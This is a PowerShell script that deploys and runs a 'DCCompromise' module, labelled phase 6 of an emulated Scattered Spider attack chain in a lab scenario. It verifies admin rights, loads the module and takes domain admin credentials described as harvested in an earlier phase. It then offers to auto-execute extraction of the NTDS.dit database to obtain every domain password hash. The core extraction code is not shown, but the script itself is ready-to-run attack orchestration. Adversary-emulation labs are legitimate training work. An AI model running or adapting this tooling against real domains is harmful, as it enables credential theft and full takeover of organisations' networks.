# === Domain Controller Compromise Deployment ===
# Deploys DCCompromise module for NTDS.dit extraction
# Phase 6 of Scattered Spider attack chain

param(
    [string]$Username = "",
    [string]$Password = "",
    [string]$Domain = "",
    [string]$DomainController = "",
    [string]$OutputDirectory = "C:\Intel\Logs",
    [switch]$UseCurrentCredentials = $false,
    [switch]$AutoExecute = $false
)

Write-Host "========================================" -ForegroundColor Magenta
Write-Host "   DC COMPROMISE DEPLOYMENT" -ForegroundColor Magenta
Write-Host "========================================" -ForegroundColor Magenta
Write-Host ""

$currentPath = Get-Location
$moduleRoot = Join-Path $currentPath "Post-Exploit\DCCompromise"

Write-Host "[*] Current working directory: $currentPath" -ForegroundColor Gray
Write-Host "[*] DCCompromise module path: $moduleRoot" -ForegroundColor Gray
Write-Host ""

# Verify module structure
Write-Host "=== MODULE VERIFICATION ===" -ForegroundColor Cyan
$requiredFiles = @(
    "DCCompromise.psm1",
    "NTDS Extraction (T1003.003).ps1"
)

$allFilesPresent = $true
foreach ($file in $requiredFiles) {
    $filePath = Join-Path $moduleRoot $file
    if (Test-Path $filePath) {
        Write-Host "[+] Found: $file" -ForegroundColor Green
    } else {
        Write-Host "[!] Missing: $file" -ForegroundColor Red
        $allFilesPresent = $false
    }
}

if (-not $allFilesPresent) {
    Write-Error "Required DCCompromise module files are missing. Deployment cannot continue."
    exit 1
}

Write-Host ""

# Check admin privileges
Write-Host "=== PRIVILEGE CHECK ===" -ForegroundColor Cyan
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
$isAdmin = $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if ($isAdmin) {
    Write-Host "[+] Running with administrative privileges (required for DC compromise)" -ForegroundColor Green
} else {
    Write-Host "[!] Not running with admin privileges - DC compromise may fail" -ForegroundColor Red
    Write-Host "[!] NTDS extraction requires administrative access" -ForegroundColor Red
}

Write-Host ""

# Import the DCCompromise module
Write-Host "=== MODULE DEPLOYMENT ===" -ForegroundColor Cyan
Write-Host "[*] Importing DCCompromise PowerShell module..." -ForegroundColor Yellow

$modulePath = Join-Path $moduleRoot "DCCompromise.psm1"
try {
    Import-Module $modulePath -Force -DisableNameChecking
    Write-Host "[+] DCCompromise module imported successfully" -ForegroundColor Green
}
catch {
    Write-Error "Failed to import DCCompromise module: $($_.Exception.Message)"
    exit 1
}

# Configure module settings
if ($Username -or $Password -or $Domain -or $DomainController -or $OutputDirectory) {
    Write-Host "[*] Configuring module settings..." -ForegroundColor Yellow
    Set-DCCompromiseConfig -Username $Username -Password $Password -Domain $Domain -DomainController $DomainController -OutputDirectory $OutputDirectory
}

# Credential validation
if (-not $UseCurrentCredentials) {
    if (-not $Username -or -not $Password) {
        Write-Host "[!] WARNING: No domain admin credentials provided" -ForegroundColor Red
        Write-Host "[!] Use credentials extracted from previous CredExtraction phase" -ForegroundColor Yellow
        Write-Host "[!] Or use -UseCurrentCredentials if current user has domain admin rights" -ForegroundColor Yellow
    } else {
        Write-Host "[+] Domain admin credentials configured: $Username" -ForegroundColor Green
    }
} else {
    Write-Host "[+] Using current user credentials for DC compromise" -ForegroundColor Green
    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    Write-Host "[+] Current user: $($currentUser.Name)" -ForegroundColor Green
}

Write-Host ""

# Display available functions
Write-Host "=== AVAILABLE COMMANDS ===" -ForegroundColor Cyan
Write-Host "Core Functions:" -ForegroundColor Yellow
Write-Host "  Invoke-FullDCCompromise        - Execute complete DC compromise workflow" -ForegroundColor White
Write-Host "  Run-DCCompromise               - Alias for full compromise" -ForegroundColor White
Write-Host "  Get-DCCompromiseResults        - View compromise results" -ForegroundColor White
Write-Host "  Get-DCResults                  - Alias for results viewing" -ForegroundColor White
Write-Host ""
Write-Host "Individual Functions:" -ForegroundColor Yellow
Write-Host "  Invoke-DCDiscovery             - Discover Domain Controllers" -ForegroundColor White
Write-Host "  Test-DomainAdminCredentials    - Validate domain admin creds" -ForegroundColor White
Write-Host "  Invoke-NTDSExtraction          - Extract NTDS.dit database (T1003.003)" -ForegroundColor White
Write-Host ""
Write-Host "Configuration:" -ForegroundColor Yellow
Write-Host "  Set-DCCompromiseConfig -Username <user> -Password <pass> -Domain <domain>" -ForegroundColor White
Write-Host ""

# Display attack context
Write-Host "=== ATTACK CONTEXT ===" -ForegroundColor Cyan
Write-Host "Lab Scenario Flow:" -ForegroundColor Yellow
Write-Host "✓ Phase 1: Irene opened AnyDesk ZIP → Remote admin access established" -ForegroundColor Green
Write-Host "✓ Phase 2: Repository cloned → Attack tools staged" -ForegroundColor Green
Write-Host "✓ Phase 3: Host reconnaissance → Local system enumerated" -ForegroundColor Green
Write-Host "✓ Phase 4: AD reconnaissance → Domain structure mapped" -ForegroundColor Green
Write-Host "✓ Phase 5: Credential extraction → Sherlock's domain admin creds harvested" -ForegroundColor Green
Write-Host "➡️ Phase 6: DC compromise → Extract NTDS.dit for complete domain takeover" -ForegroundColor Red
Write-Host ""
Write-Host "Expected Outcome:" -ForegroundColor Yellow
Write-Host "- NTDS.dit database extracted from domain controller" -ForegroundColor Gray
Write-Host "- All domain password hashes obtained" -ForegroundColor Gray
Write-Host "- Complete domain compromise achieved" -ForegroundColor Gray

Write-Host ""

# Auto-execute if requested
if ($AutoExecute) {
    Write-Host "=== AUTO-EXECUTION ===" -ForegroundColor Cyan
    Write-Host "[*] Auto-executing full DC compromise..." -ForegroundColor Yellow
    Write-Host ""
    
    try {
        Invoke-FullDCCompromise -Username $Username -Password $Password -Domain $Domain -UseCurrentCredentials:$UseCurrentCredentials
    }
    catch {
        Write-Host "[!] Auto-execution failed: $($_.Exception.Message)" -ForegroundColor Red
    }
} else {
    Write-Host "========================================" -ForegroundColor Magenta
    Write-Host "   DEPLOYMENT COMPLETE" -ForegroundColor Magenta
    Write-Host "========================================" -ForegroundColor Magenta
    Write-Host ""
    Write-Host "DCCompromise module is now ready for use!" -ForegroundColor Green
    Write-Host ""
    Write-Host "Quick Start:" -ForegroundColor Yellow
    if ($UseCurrentCredentials) {
        Write-Host "  Run-DCCompromise -UseCurrentCredentials  # Use current user for DC compromise" -ForegroundColor Gray
    } elseif ($Username -and $Password) {
        Write-Host "  Run-DCCompromise                         # Use configured domain admin creds" -ForegroundColor Gray
    } else {
        Write-Host "  Run-DCCompromise -Username <user> -Password <pass>  # Provide domain admin creds" -ForegroundColor Gray
    }
    Write-Host "  Get-DCResults                            # View compromise results" -ForegroundColor Gray
    Write-Host ""
    Write-Host "Output Location: $OutputDirectory" -ForegroundColor Cyan
    
    # Prompt for immediate execution
    Write-Host ""
    if ($UseCurrentCredentials -or ($Username -and $Password)) {
        $executeNow = Read-Host "Execute DC compromise now? (Y/n)"
        if ($executeNow -eq "" -or $executeNow -eq "Y" -or $executeNow -eq "y") {
            Write-Host ""
            Write-Host "[*] Executing full DC compromise..." -ForegroundColor Cyan
            Write-Host "[*] Using Sherlock's domain admin credentials for NTDS extraction..." -ForegroundColor Yellow
            try {
                Invoke-FullDCCompromise -Username $Username -Password $Password -Domain $Domain -UseCurrentCredentials:$UseCurrentCredentials
            }
            catch {
                Write-Host "[!] Execution failed: $($_.Exception.Message)" -ForegroundColor Red
            }
        }
    } else {
        Write-Host "[!] Cannot auto-execute without valid domain admin credentials" -ForegroundColor Yellow
        Write-Host "[!] Provide credentials or use -UseCurrentCredentials flag" -ForegroundColor Yellow
    }
}